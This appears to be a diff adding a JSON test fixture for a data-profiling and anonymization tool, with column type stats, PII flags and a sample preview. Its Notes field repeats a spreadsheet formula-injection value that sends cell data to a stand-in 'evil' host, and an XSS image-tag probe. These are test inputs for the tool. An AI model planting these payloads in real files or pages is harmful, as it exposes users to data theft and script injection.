+     "unique_count": 38
+    },
+    {
+     "column": "Amount",
+     "detected_type": "Float",
+     "null_count": 1,
+     "null_percentage": 2.5,
+     "unique_count": 38
+    },
+    {
+     "column": "Email",
+     "detected_type": "Email",
+     "null_count": 1,
+     "null_percentage": 2.5,
+     "unique_count": 38
+    }
+   ],
+   "memory_info": {
+    "by_column": {
+     "Account": {
+      "bytes": 320,
+      "mb": 0.0
+     },
+     "Amount": {
+      "bytes": 320,
+      "mb": 0.0
+     },
+     "BigId": {
+      "bytes": 320,
+      "mb": 0.0
+     },
+     "Date": {
+      "bytes": 2360,
+      "mb": 0.002
+     },
+     "DateText": {
+      "bytes": 2360,
+      "mb": 0.002
+     },
+     "Email": {
+      "bytes": 2648,
+      "mb": 0.003
+     },
+     "EuroNum": {
+      "bytes": 2127,
+      "mb": 0.002
+     },
+     "Flag": {
+      "bytes": 2139,
+      "mb": 0.002
+     },
+     "ID": {
+      "bytes": 2280,
+      "mb": 0.002
+     },
+     "Name": {
+      "bytes": 2131,
+      "mb": 0.002
+     },
+     "Notes": {
+      "bytes": 2892,
+      "mb": 0.003
+     },
+     "Pct": {
+      "bytes": 2106,
+      "mb": 0.002
+     },
+     "Region": {
+      "bytes": 1766,
+      "mb": 0.002
+     },
+     "Zip": {
+      "bytes": 320,
+      "mb": 0.0
+     }
+    },
+    "total_mb": 0.02
+   },
+   "overview": {
+    "detected_types_count": {
+     "Boolean": 1,
+     "Date": 2,
+     "Email": 1,
+     "Float": 2,
+     "ID/Serial": 1,
+     "Integer": 2,
+     "Percentage": 1,
+     "Text": 4
+    },
+    "dtypes_count": {
+     "float64": 2,
+     "int64": 2,
+     "object": 10
+    },
+    "duplicate_rows": 1,
+    "has_duplicates": true,
+    "memory_usage_bytes": 24167,
+    "memory_usage_mb": 0.02,
+    "reclassified_columns": 6,
+    "shape": {
+     "columns": 14,
+     "rows": 40
+    }
+   },
+   "sensitive_columns": [
+    {
+     "column": "Account",
+     "pattern_matched": "account",
+     "unique_count": 38
+    },
+    {
+     "column": "Name",
+     "pattern_matched": "name",
+     "unique_count": 4
+    },
+    {
+     "column": "Email",
+     "pattern_matched": "email",
+     "unique_count": 38
+    }
+   ]
+  },
+  "columns": [
+   "ID",
+   "Zip",
+   "Account",
+   "BigId",
+   "Amount",
+   "Region",
+   "Date",
+   "DateText",
+   "EuroNum",
+   "Pct",
+   "Flag",
+   "Name",
+   "Email",
+   "Notes"
+  ],
+  "preview": [
+   {
+    "Account": "1000",
+    "Amount": "-300.0",
+    "BigId": "9007199254740993",
+    "Date": "2024-01-01",
+    "DateText": "01/02/2024",
+    "Email": "alice0@example.com",
+    "EuroNum": "2,5",
+    "Flag": "True",
+    "ID": "PR-00001",
+    "Name": "Alice",
+    "Notes": "=HYPERLINK(\"http://evil/?\"&A2,\"x\")",
+    "Pct": "50%",
+    "Region": "N",
+    "Zip": "01000"
+   },
+   {
+    "Account": "1001",
+    "Amount": "-262.5",
+    "BigId": "9007199254740994",
+    "Date": "2024-01-02",
+    "DateText": "2024-03-05",
+    "Email": null,
+    "EuroNum": "1.234,56",
+    "Flag": "False",
+    "ID": "PR-00002",
+    "Name": "Bob",
+    "Notes": "x|||y",
+    "Pct": "0.5",
+    "Region": "S",
+    "Zip": "01007"
+   },
+   {
+    "Account": "1002",
+    "Amount": "-225.0",
+    "BigId": "9007199254740995",
+    "Date": "2024-01-03",
+    "DateText": "13/02/2024",
+    "Email": "carol2@example.com",
+    "EuroNum": "10",
+    "Flag": "True",
+    "ID": "PR-00003",
+    "Name": "Carol",
+    "Notes": "<img src=x onerror=alert(1)>",
+    "Pct": "12.5%",
+    "Region": null,
+    "Zip": "01014"
+   },
+   {
+    "Account": "1003",
+    "Amount": "-187.5",
+    "BigId": "9007199254740996",
+    "Date": "2024-01-04",
+    "DateText": "01/02/2024",
+    "Email": "dave3@example.com",
+    "EuroNum": "2,5",
+    "Flag": "False",
+    "ID": "PR-00004",
+    "Name": "Dave",
+    "Notes": "café",
+    "Pct": "50%",
+    "Region": "N",
+    "Zip": "01021"
+   },
+   {
+    "Account": null,
+    "Amount": "-150.0",
+    "BigId": "9007199254740997",
+    "Date": "2024-01-05",
+    "DateText": "2024-03-05",
+    "Email": "alice4@example.com",
+    "EuroNum": "1.234,56",
+    "Flag": "True",
+    "ID": "PR-00005",
+    "Name": "Alice",
+    "Notes": "=HYPERLINK(\"http://evil/?\"&A2,\"x\")",
+    "Pct": "0.5",
+    "Region": "S",
+    "Zip": "01028"
+   },
+   {
+    "Account": "1005",
+    "Amount": "-112.5",
+    "BigId": "9007199254740998",
+    "Date": "2024-01-06",
+    "DateText": "13/02/2024",
+    "Email": "bob5@example.com",
+    "EuroNum": "10",
+    "Flag": "False",
+    "ID": "PR-00006",
+    "Name": "Bob",
+    "Notes": "x|||y",
+    "Pct": "12.5%",
+    "Region": null,
+    "Zip": "01035"
+   },
+   {
+    "Account": "1006",
+    "Amount": "-75.0",
+    "BigId": "9007199254740999",
+    "Date": "2024-01-07",
+    "DateText": "01/02/2024",
+    "Email": "carol6@example.com",
+    "EuroNum": "2,5",
+    "Flag": "True",
+    "ID": "PR-00007",
+    "Name": "Carol",
+    "Notes": "<img src=x onerror=alert(1)>",
+    "Pct": "50%",
+    "Region": "N",
+    "Zip": "01042"
+   },
+   {
+    "Account": "1006",
+    "Amount": "-75.0",
+    "BigId": "9007199254740999",
+    "Date": "2024-01-07",
+    "DateText": "01/02/2024",
+    "Email": "carol6@example.com",
+    "EuroNum": "2,5",
+    "Flag": "True",
+    "ID": "PR-00007",
+    "Name": "Carol",
+    "Notes": "<img src=x onerror=alert(1)>",
+    "Pct": "50%",
+    "Region": "N",
+    "Zip": "01042"
+   },
+   {
+    "Account": "1008",
+    "Amount": "0.0",
+    "BigId": "9007199254741001",
+    "Date": "2024-01-09",
+    "DateText": "13/02/2024",
+    "Email": "alice8@example.com",
+    "EuroNum": "10",
+    "Flag": "True",
+    "ID": "PR-00009",
+    "Name": "Alice",
+    "Notes": "=HYPERLINK(\"http://evil/?\"&A2,\"x\")",
+    "Pct": "12.5%",
+    "Region": null,
+    "Zip": "01056"
+   },
+   {
+    "Account": "1009",
+    "Amount": "37.5",
+    "BigId": "9007199254741002",
+    "Date": "2024-01-10",
+    "DateText": "01/02/2024",
+    "Email": "bob9@example.com",
+    "EuroNum": "2,5",
+    "Flag": "False",
+    "ID": "PR-00010",
+    "Name": "Bob",
+    "Notes": "x|||y",
+    "Pct": "50%",
+    "Region": "N",
+    "Zip": "01063"
+   },
+   {
+    "Account": "1010",
+    "Amount": null,
+    "BigId": "9007199254741003",
+    "Date": "2024-01-11",
+    "DateText": "2024-03-05",
+    "Email": "carol10@example.com",
+    "EuroNum": "1.234,56",
+    "Flag": "True",
+    "ID": "PR-00011",
+    "Name": "Carol",
+    "Notes": "<img src=x onerror=alert(1)>",
+    "Pct": "0.5",
+    "Region": "S",
+    "Zip": "01070"
+   },
+   {
+    "Account": "1011",
+    "Amount": "112.5",
+    "BigId": "9007199254741004",
+    "Date": "2024-01-12",
+    "DateText": "13/02/2024",
+    "Email": "dave11@example.com",
+    "EuroNum": "10",
+    "Flag": "False",
+    "ID": "PR-00012",
+    "Name": "Dave",
+    "Notes": "café",
+    "Pct": "12.5%",
+    "Region": null,
+    "Zip": "01077"
+   },
+   {
+    "Account": "1012",
+    "Amount": "150.0",
+    "BigId": "9007199254741005",
+    "Date": "2024-01-13",
+    "DateText": "01/02/2024",
+    "Email": "alice12@example.com",
+    "EuroNum": "2,5",
+    "Flag": "True",
+    "ID": "PR-00013",
+    "Name": "Alice",
+    "Notes": "=HYPERLINK(\"http://evil/?\"&A2,\"x\")",
+    "Pct": "50%",
+    "Region": "N",
+    "Zip": "01084"
+   },
+   {
+    "Account": "1013",
+    "Amount": "187.5",
+    "BigId": "9007199254741006",
+    "Date": "2024-01-14",
+    "DateText": "2024-03-05",
+    "Email": "bob13@example.com",
+    "EuroNum": "1.234,56",
+    "Flag": "False",
+    "ID": "PR-00014",
+    "Name": "Bob",
+    "Notes": "x|||y",
+    "Pct": "0.5",
+    "Region": "S",
+    "Zip": "01091"
+   },
+   {
+    "Account": "1014",
+    "Amount": "225.0",
+    "BigId": "9007199254741007",
+    "Date": "2024-01-15",
+    "DateText": "13/02/2024",
+    "Email": "carol14@example.com",
+    "EuroNum": "10",
+    "Flag": "True",
+    "ID": "PR-00015",
+    "Name": "Carol",
+    "Notes": "<img src=x onerror=alert(1)>",
+    "Pct": "12.5%",
+    "Region": null,
+    "Zip": "01098"
+   },
+   {
+    "Account": "1015",
+    "Amount": "262.5",
+    "BigId": "9007199254741008",
+    "Date": "2024-01-16",
+    "DateText": "01/02/2024",
+    "Email": "dave15@example.com",
+    "EuroNum": "2,5",
+    "Flag": "False",
+    "ID": "PR-00016",
+    "Name": "Dave",
+    "Notes": "café",
+    "Pct": "50%",
+    "Region": "N",
+    "Zip": "01105"
+   },
+   {
+    "Account": "1016",
+    "Amount": "300.0",
+    "BigId": "9007199254741009",
+    "Date": "2024-01-17",
+    "DateText": "2024-03-05",
+    "Email": "alice16@example.com",
+    "EuroNum": "1.234,56",
+    "Flag": "True",
+    "ID": "PR-00017",
+    "Name": "Alice",
+    "Notes": "=HYPERLINK(\"http://evil/?\"&A2,\"x\")",
+    "Pct": "0.5",
+    "Region": "S",
+    "Zip": "01112"
+   },
+   {
+    "Account": "1017",
+    "Amount": "337.5",
+    "BigId": "9007199254741010",
+    "Date": "2024-01-18",
+    "DateText": "13/02/2024",
+    "Email": "bob17@example.com",
+    "EuroNum": "10",
+    "Flag": "False",
+    "ID": "PR-00018",
+    "Name": "Bob",
+    "Notes": "x|||y",
+    "Pct": "12.5%",
+    "Region": null,
+    "Zip": "01119"
+   },
+   {
+    "Account": "1018",
+    "Amount": "375.0",
+    "BigId": "9007199254741011",
+    "Date": "2024-01-19",
+    "DateText": "01/02/2024",
+    "Email": "carol18@example.com",
+    "EuroNum": "2,5",
+    "Flag": "True",
+    "ID": "PR-00019",
+    "Name": "Carol",
+    "Notes": "<img src=x onerror=alert(1)>",
+    "Pct": "50%",
+    "Region": "N",
+    "Zip": "01126"
+   },
+   {
+    "Account": "1019",
+    "Amount": "412.5",
+    "BigId": "9007199254741012",
+    "Date": "2024-01-20",
+    "DateText": "2024-03-05",
+    "Email": "dave19@example.com",
+    "EuroNum": "1.234,56",
+    "Flag": "False",
+    "ID": "PR-00020",
+    "Name": "Dave",
+    "Notes": "café",
+    "Pct": "0.5",
+    "Region": "S",
+    "Zip": "01133"
+   }
+  ],
+  "stage_data": {
+   "1": true,
+   "2": false,
+   "3": false,
+   "4": false,
+   "5": false
+  },
+  "state": {
+   "col_count": 14,
+   "current_stage": 2,
+   "row_count": 40,
+   "stages_completed": [
+    1
+   ]
+  },
+  "success": true,
+  "user_decisions": {
+   "2": {},
+   "3": {},
+   "4": {}
+  }
+ },
+ "transformations": {
+  "current_selections": {},
+  "recommendations": [
+   {
+    "column_details": [
+     {
+      "column": "Account",
+      "explanation": "Contains account numbers - will be replaced with placeholders like ACC_00001",
+      "pattern": "account",
+      "unique_values": 38
+     },
+     {
+      "column": "Name",
+      "explanation": "Contains personal names - will be replaced with placeholders like NAM_00001",
+      "pattern": "name",
+      "unique_values": 4
+     },
+     {
+      "column": "Email",
+      "explanation": "Contains email addresses - will be replaced with placeholders like EMA_00001",
+      "pattern": "email",
+      "unique_values": 38
+     }
+    ],
+    "columns": [
+     "Account",
+     "Name",
+     "Email"
+    ],
+    "description": "Protect personally identifiable information (PII) by replacing each distinct value with a consistent placeholder (the same value always gets the same placeholder, so joins and counts still work).",
+    "priority": "high",
+    "title": "Data Anonymization",
+    "type": "anonymization"
+   },
+   {
+    "column_details": [
+     {
+      "column": "Date",
+      "current": "object",
+      "detected": "Date",
+      "explanation": "Stored as text but contains dates - flagged only: this pipeline does not convert it (use the Data Normalizer)"
+     },
+     {
+      "column": "DateText",
+      "current": "object",
+      "detected": "Date",
+      "explanation": "Stored as text but contains dates - flagged only: this pipeline does not convert it (use the Data Normalizer)"
+     }
+    ],
+    "columns": [
+     "Date",
+     "DateText"
+    ],
+    "description": "Convert columns to their proper data types. This improves data quality, enables proper sorting, and allows mathematical operations.",
+    "priority": "medium",
+    "title": "Data Type Normalization",
+    "type": "normalization"
+   }
+  ],
+  "success": true
+ },
+ "transformations_status": 200
+}
